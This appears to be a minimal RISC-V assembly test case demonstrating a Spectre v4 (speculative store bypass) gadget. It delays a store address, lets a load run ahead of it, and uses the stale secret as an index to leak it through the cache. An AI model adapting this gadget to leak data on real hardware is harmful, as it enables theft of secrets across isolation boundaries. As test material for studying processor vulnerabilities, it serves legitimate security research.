#------------------------------------------------------------------------------
# SpectreV4 minimal example.
#------------------------------------------------------------------------------
#include "memcfg.h"

.text
  li s0, UDATA
  addi s1, s0, 0x80
  li t0, 0xdeadbeef
  sd t0, 0(s0)
  fence

attack:
  mv t2, s0
  # Slow down computation of store address.
  li t1, 6
  mul t2, t2, t1
  div t2, t2, t1
  mul t2, t2, t1
  div t2, t2, t1
  # Zero-out memory in s0.
  li t1, 0
  sd t1, 0(t2)

  # Load from s0, reodered before the store.
  ld t0, 0(s0)
  # Use the secret as index.
  andi t0, t0, 0xFF
  add  t0, t0, s2
  # Second load: leaks the secret.
  ld t1, 0(t0)

  # Illegal instruction: end of test case.
  unimp

# #include "data.h"
